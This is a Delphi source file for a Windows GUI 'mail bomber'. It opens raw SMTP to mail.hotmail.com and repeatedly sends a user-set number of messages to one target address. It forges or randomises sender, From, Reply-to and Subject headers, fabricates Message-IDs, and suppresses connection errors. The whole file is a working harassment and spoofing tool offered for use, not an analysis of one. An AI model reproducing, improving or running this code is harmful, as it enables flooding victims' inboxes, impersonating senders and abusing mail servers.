   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, ScktComp, StdCtrls, jpeg, ExtCtrls, shellapi, ComCtrls;

   type
     TForm1 = class(TForm)
       Image1: TImage;
       Edit1: TEdit;
       Mail: TClientSocket;
       Label1: TLabel;
       Label2: TLabel;
       Edit2: TEdit;
       Label3: TLabel;
       Edit3: TEdit;
       Label4: TLabel;
       Edit4: TEdit;
       ProgressBar1: TProgressBar;
       Label5: TLabel;
       Edit5: TEdit;
       Button1: TButton;
       Button2: TButton;
       Label6: TLabel;
       Label7: TLabel;
       Edit6: TEdit;
       Button3: TButton;
       ProgressBar2: TProgressBar;
       Memo1: TMemo;
       Label8: TLabel;
       Edit7: TEdit;
       Button4: TButton;
       Label9: TLabel;
       procedure Button1Click(Sender: TObject);
       procedure MailConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure MailRead(Sender: TObject; Socket: TCustomWinSocket);
       procedure Image1Click(Sender: TObject);
       procedure Label6Click(Sender: TObject);
       procedure Button3Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure MailError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure Button4Click(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   const
     RM:string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-';
   //           0123456789012345678901234567890123456789012345678901234567890123
   //                     111111111122222222223333333333444444444455555555556666
   var
     Form1: TForm1;
     stop:boolean;
   implementation

   uses Unit2;

   {$R *.dfm}

   procedure TForm1.Button1Click(Sender: TObject);
   begin
   if mail.Active = true then mail.Active := false;
   button1.Enabled := false;
    mail.Host := 'mail.hotmail.com';
    mail.port := 25;
    mail.Active := true;
   end;

   function rname:string;
   var
    i:integer;
    s:string;
   begin
   i:=random(29);
   while length(s) <= i do begin
    randomize();
    s:=s+copy(RM,random(63),1);
    sleep(20);
   end;
   result := s;
   end;

   procedure sugva;
   var
    server,a,b,f:string;
    var i:integer;
   begin
   form1.progressbar2.Max := strtoint(form1.edit5.text);
   stop := false;
   for i:=0 to strtoint(form1.edit5.text)-1 do begin

   //sleep(800);
   if stop then begin
   form1.ProgressBar1.Position := 0;
   form1.ProgressBar2.Position := 0;
   form1.button1.Enabled := true;
   exit;
   end;
   server := 'mail.hotmail.com';
   form1.progressbar1.Position := 0;
   form1.mail.Socket.SendText('HELO hotmail.com'+#13#10);
   form1.progressbar1.Position := 1;
   if form1.edit3.text = '<RANDOM>' then
   form1.mail.Socket.SendText('MAIL FROM: <'+rname+'@hotmail.com>'+#13#10)
   else
   form1.mail.Socket.SendText('MAIL FROM: <'+form1.edit3.text+'>'+#13#10);
   form1.progressbar1.Position := 2;
   form1.mail.Socket.SendText('RCPT TO: <'+form1.edit1.text+'>'+#13#10);
   form1.progressbar1.Position := 3;
   form1.mail.Socket.SendText('DATA'+#13#10);
   form1.progressbar1.Position := 4;
   (**********************************)

   randomize();

   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   f := 'Message-ID: '+a+'.'+b+'.qmail@' + copy(server,pos('.',server)+1,length(server));

   (**********************************)
   form1.mail.Socket.SendText(f+#13#10);
   form1.progressbar1.Position := 5;
   form1.mail.Socket.SendText('DATE: 13:37:00'+#13#10);
   form1.progressbar1.Position := 6;
   if form1.edit4.text = '<RANDOM>' then
   form1.mail.Socket.SendText('FROM: '+rname+' <'+rname+'@hotmail.com>'+#13#10)
   else
   form1.mail.Socket.SendText('FROM: '+form1.edit3.text+' <'+form1.edit4.text+'@hotmail.com>'+#13#10);
   form1.progressbar1.Position := 7;
   if form1.edit2.text = '<RANDOM>' then
   form1.mail.Socket.SendText('TO: '+rname+' <'+form1.edit1.text+'>'+#13#10)
   else
   form1.mail.Socket.SendText('TO: '+form1.edit2.text+' <'+form1.edit1.text+'>'+#13#10);
   form1.progressbar1.Position := 8;
   if form1.edit4.text = '<RANDOM>' then
   form1.mail.Socket.SendText('Reply-to: '+rname+' <'+rname+'@hotmail.com>'+#13#10)
   else
   form1.mail.Socket.SendText('Reply-to: '+form1.edit3.text+' <'+form1.edit4.text+'@hotmail.com>'+#13#10);
   form1.progressbar1.Position := 9;
   if form1.edit7.text = '<RANDOM>' then
   form1.mail.Socket.SendText('SUBJECT: '+rname+#13#10)
   else
   form1.mail.Socket.SendText('SUBJECT: '+form1.edit7.text+#13#10);
   form1.progressbar1.Position := 10;
   form1.mail.Socket.SendText(form1.memo1.text+#13#10);
   form1.progressbar1.Position := 11;
   sleep(1000);
   form1.mail.Socket.SendText(#13#10+'.'+#13#10);
   form1.progressbar1.Position := 13;
   form1.progressbar2.Position := form1.progressbar2.Position +1;
   form1.label9.caption := inttostr(form1.progressbar2.position)+' Sent';
   end;
   form1.progressbar1.Position := 0;
   form1.progressbar2.Position := 0;
   form1.mail.Socket.SendText('QUIT'+#13#10);
   form1.button1.Enabled := true;
   form1.mail.Active := false;
   end;

   procedure TForm1.MailConnect(Sender: TObject; Socket: TCustomWinSocket);
   var TC:longword;
   begin
   randomize;
   tc:=random(5823953);
   createthread(0,0,@sugva,0,0,TC);
   end;

   procedure TForm1.MailRead(Sender: TObject; Socket: TCustomWinSocket);
   begin
   //memo1.text := memo1.text + #13#10 + socket.ReceiveText;
   end;

   procedure TForm1.Image1Click(Sender: TObject);
   begin
   shellexecute(0,'Open','Http://www.imafraid.com',nil,nil,1);
   end;

   procedure TForm1.Label6Click(Sender: TObject);
   begin
   shellexecute(0,'Open','Http://www.imafraid.com',nil,nil,1);
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   begin
   form2.show;
   end;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
   STOP:=true;
   end;

   procedure TForm1.MailError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode :=0 ;
   end;

   procedure TForm1.Button4Click(Sender: TObject);
   begin
   messagebox(0,'if text is <RANDOM> it will be randomized','Note',mb_ok);
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   update;
   form1.Repaint;
   form1.Refresh;
   end;

   end.
